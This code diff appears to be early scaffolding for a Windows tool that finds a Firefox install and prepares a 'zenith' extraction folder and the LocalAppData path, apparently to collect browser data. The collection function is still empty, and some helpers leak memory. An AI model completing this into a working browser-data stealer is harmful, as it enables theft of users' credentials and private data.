@@ -1,20 +1,28 @@
+#include <iostream>
 #include <stdio.h>
 #include <tchar.h>
+#include <string>
 
 #include <windows.h>
+#include <shlobj.h>
+
+// #pragma comment(lib, "shell32.lib")
 
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
-#define PATH_TO_EXTRACTED_DATA "Documents\\zenith"
 
 bool verify_browser_installation(const LPCWSTR p_name);
-void create_extraction_directory();
 void collect_firefox_data();
+
+// Helper functions
+wchar_t* convert_to_wchar(const char* charArray);
+std::string create_extraction_directory();
+std::string get_local_appdata_path();
 
 int main(int argc, char** argv) {
 	// Firefox
 	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
-	{
+	{	
 		collect_firefox_data();
 	}
 
@@ -84,10 +92,44 @@ bool verify_browser_installation(const LPCWSTR p_name) {
 	return false;
 }
 
-void create_extraction_directory() {
-
+void collect_firefox_data() {
+	std::string path_to_extraction_directory = create_extraction_directory();
+	std::string path_to_appdata = get_local_appdata_path();
+	if (path_to_extraction_directory != "" && path_to_appdata != "") {
+		
+	}
 }
 
-void collect_firefox_data() {
+std::string create_extraction_directory() {
+	wchar_t Folder[1024];
+	HRESULT hr = SHGetFolderPathW(0, CSIDL_MYDOCUMENTS, 0, 0, Folder);
+	if (SUCCEEDED(hr))
+	{
+		char path[1024];
+		wcstombs(path, Folder, 1023);
+		std::strcat(path, "\\zenith");
+		CreateDirectory(convert_to_wchar(path), NULL);
+
+		return path;
+	}
+	return "";
+}
+
+wchar_t* convert_to_wchar(const char* charArray)
+{
+	wchar_t* wString = new wchar_t[4096];
+	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
 	
+	return wString;
+}
+
+std::string get_local_appdata_path() {
+	wchar_t Folder[1024];
+	HRESULT hr = SHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Folder);
+	if (SUCCEEDED(hr)) {
+		char path[1024];
+		wcstombs(path, Folder, 1023);
+		return path;
+	}
+	return "";
 }
